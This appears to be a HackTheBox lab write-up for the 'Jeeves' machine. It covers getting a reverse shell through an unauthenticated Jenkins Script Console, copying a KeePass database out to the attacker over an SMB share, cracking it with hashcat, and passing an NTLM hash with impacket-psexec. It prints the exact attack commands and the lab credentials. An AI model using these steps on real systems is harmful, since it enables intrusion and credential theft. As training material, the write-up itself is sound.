---
title: "Jeeves"
date: 2024-11-11T12:54:22-06:00
draft: false
tags:
- Windows
- Jenkins
- KeePass
- Broken Authentication
- Broken Access Control
- HTB
---

![Jeeves](/img/jeeves/jeeves.png#center)

### Description
Jeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator's NTLM hash.

### Recon
Starting off with a nmap scan:
```
# Nmap 7.94SVN scan initiated Mon Nov 11 13:02:01 2024 as: nmap -p- -A -v -T4 -oN /tmp/nmap.scan 10.10.10.63
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -211723 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Mon Nov 11 12:55:57 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-12T00:05:55
|_  start_date: 2024-11-11T23:57:06
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.96 ms 10.10.14.1
2   45.71 ms 10.10.10.63

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 11 13:05:35 2024 -- 1 IP address (1 host up) scanned in 214.46 seconds
```

I found several services, including SMB, RPC, and two HTTP servers on ports 80 and 50000. Enumerating the web server on port 80 and SMB do not reveal anything interesting. I was able to use RPC to find some endpoints, but I did not see anyway I could exploit Jeeves with the information.

```
┌──(kali㉿kali)-[~]
└─$ impacket-rpcdump -p 135 10.10.10.63
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.10.63
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.10.63[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\JEEVES[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc097380]
          ncalrpc:[WMsgKRpc097A31]

Protocol: N/A 
Provider: N/A 
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
Bindings: 
          ncalrpc:[LRPC-f01d6a34deb1026cb0]
          ncalrpc:[dabrpc]
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-f24b240fdec2bc8c52]
          ncalrpc:[LRPC-bb6163cae863dbd5f9]
          ncalrpc:[LRPC-82dd959ab6b7e8366d]
          ncacn_np:\\JEEVES[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-300bf2e2daeee2de9a]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

...
```

However, I did find an interesting directory on the port 50000 website.

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -C 404 -n
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves => http://10.10.10.63:50000/askjeeves/
[####################] - 2m    119601/119601  0s      found:1       errors:0      
[####################] - 2m    119601/119601  1048/s  http://10.10.10.63:50000/
```

We find a Jenkins dashboard.

![Jenkins Server](/img/jeeves/jenkins_web.png)

Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking ```config.xml``` and finding the unsecured authorization strategy in use. 

```<authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>```


### Foothold
We can leverage our permissions to access the Script Console by going to "Mange Jenkins" > "Script Console". 

![Jenkins Script Console](/img/jeeves/script_console.png)

Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.

```
┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.63] 49681
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>
```


### Privilege Escalation
I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.

```
C:\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Unfortunately, this turns out to be a false lead. We'll have to look for other privesc vectors.

```
C:\Temp>.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140717164658688
[*] DispatchTable: 0x140717166622152
[*] UseProtseqFunction: 0x140717166124880
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0f34-ffff-9033-ef4aa84d1797
[*] DCOM obj OXID: 0xb7f5e435d7866f08
[*] DCOM obj OID: 0x59d6cba54f6519d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
```

Eventually, I come across a KeePass database file.

```
C:\>dir /s /b *.kdbx
dir /s /b *.kdbx
C:\Users\kohsuke\Documents\CEH.kdbx
```

KeePass files are password-protected and I don't have the utilities to crack the password on Jeeves, so I set up a SMB share to exfiltrate the file to my attacker machine.

```
┌──(kali㉿kali)-[/tmp]
└─$ impacket-smbserver transfer /tmp/transfer -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now to mount the share and transfer CEH.kdbx.

```
C:\Users\kohsuke\Documents>net use M: \\10.10.14.31\transfer
net use M: \\10.10.14.31\transfer
The command completed successfully.


C:\Users\kohsuke\Documents>copy CEH.kdbx M:
copy CEH.kdbx M:
        1 file(s) copied.
```

Next we can extract the KeePass password hash and crack it.


```
┌──(kali㉿kali)-[/tmp/transfer]
└─$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/transfer]
└─$ hashcat -a 0 '$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48' /usr/share/wordlists/rockyou.txt -m 13400
```

We get the password ```moonshine1```. We can now view the contents of CEH.kdbx.

```
kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH> 
```

Inside the CEH group, we find some entries and more groups. Further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.

```
kpcli:/CEH> ls *
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

/CEH/eMail:

/CEH/General:

/CEH/Homebanking:

/CEH/Internet:

/CEH/Network:

/CEH/Windows:
```

There are usernames and password hashes in the entries. I created a user wordlist as well as a password wordlist and sprayed them against Jeeves. In retrospect, this was not necessary since most of these users do not exist on the machine, so I could've narrowed down my users to ```Administrator```.

```
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/CEH> show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH> show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```

None of the passwords worked, so I tried a pass-the-hash attack using the hash in entry 0 and gained access to the Administrator account. 

![Pass-the-hash](/img/jeeves/pwned.png)

And with that, Jeeves is owned.

```
┌──(kali㉿kali)-[/tmp]
└─$ impacket-psexec Administrator@10.10.10.63 -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EXTSwcYV.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service ShHJ on 10.10.10.63.....
[*] Starting service ShHJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```
